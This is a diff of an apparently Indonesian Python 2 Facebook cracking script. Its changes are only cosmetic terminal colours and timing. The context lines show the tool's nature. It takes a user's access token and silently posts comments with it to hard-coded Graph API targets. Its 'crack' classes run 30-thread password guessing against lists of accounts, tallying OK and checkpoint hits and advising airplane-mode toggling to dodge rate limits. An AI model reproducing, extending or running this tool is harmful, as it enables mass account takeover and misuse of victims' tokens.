@@ -51,7 +51,7 @@ def login():
 	elif login == "1":
                 try:
 			token=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Token  :\x1b[1;92m ")
-                        jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Please Wait ..."); time.sleep(00.1)
+                        jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Please Wait ..."); time.sleep(00.01)
                         cek=requests.get('https://graph.facebook.com/me?access_token='+token)
                         y=json.loads(cek.text)
                         nama = y['name']
@@ -101,7 +101,7 @@ def bot_follow_sayang():
 	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
 	print("\x1b[1;92m║")
-	print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;97m]\x1b[1;92m Login Success")
+	print("\x1b[1;92m╚══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Login Success...")
 	menu()
 def publik():
         try:
@@ -538,7 +538,7 @@ class crack:
 				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
 	                        print("\x1b[1;92m╠════════════════════════════════════════════════")
 	                        print("\x1b[1;92m║")
-	                        print("\x1b[1;92m╚══◍➤® Please wait ...\n")
+	                        print("\x1b[1;92m╚══◍➤® \x1b[1;97mPlease wait ...\n")
 				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
@@ -553,7 +553,7 @@ class crack:
 			print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
 	                print("\x1b[1;92m╠════════════════════════════════════════════════")
 	                print("\x1b[1;92m║")
-	                print("\x1b[1;92m╚══◍➤® Please wait ...\n")
+	                print("\x1b[1;92m╚══◍➤® \x1b[1;97mPlease wait ...\n")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
@@ -590,7 +590,7 @@ class crack:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;96m◍➤[CRACK] %s/%s [OK:%s] - [CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\x1b[1;96m◍➤[CRACK] %s/%s \x1b[1;92m[OK:%s] - \x1b[1;96m[CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 class crack2:
@@ -643,7 +643,7 @@ class crack2:
 				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
 	                        print("\x1b[1;92m╠════════════════════════════════════════════════")
 	                        print("\x1b[1;92m║")
-	                        print("\x1b[1;92m╚══◍➤® Please wait ...\n")
+	                        print("\x1b[1;92m╚══◍➤® \x1b[1;97mPlease wait ...\n")
 				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
@@ -658,7 +658,7 @@ class crack2:
 			print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
 	                print("\x1b[1;92m╠════════════════════════════════════════════════")
 	                print("\x1b[1;92m║")
-	                print("\x1b[1;92m╚══◍➤® Please wait ...\n")
+	                print("\x1b[1;92m╚══◍➤® \x1b[1;97mPlease wait ...\n")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit("\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
@@ -695,7 +695,7 @@ class crack2:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;96m◍➤[CRACK] %s/%s [OK:%s] - [CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\x1b[1;96m◍➤[CRACK] %s/%s \x1b[1;92m[OK:%s] - \x1b[1;96m[CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 class crack3:
@@ -748,7 +748,7 @@ class crack3:
 				print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
 	                        print("\x1b[1;92m╠════════════════════════════════════════════════")
 	                        print("\x1b[1;92m║")
-	                        print("\x1b[1;92m╚══◍➤® Please wait ...\n")
+	                        print("\x1b[1;92m╚══◍➤® \x1b[1;97mPlease wait ...\n")
 				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit("\n\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
@@ -763,7 +763,7 @@ class crack3:
 			print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Play Airplane Mode If No Result")
 	                print("\x1b[1;92m╠════════════════════════════════════════════════")
 	                print("\x1b[1;92m║")
-	                print("\x1b[1;92m╚══◍➤® Please wait ...\n")
+	                print("\x1b[1;92m╚══◍➤® \x1b[1;97mPlease wait ...\n")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit("\n\x1b[1;92m╚══◍➤®[\x1b[1;97mSelesai\x1b[1;92m]")
@@ -800,7 +800,7 @@ class crack3:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;96m◍➤[CRACK] %s/%s [OK:%s] - [CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\x1b[1;96m◍➤[CRACK] %s/%s \x1b[1;92m[OK:%s] - \x1b[1;96m[CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 
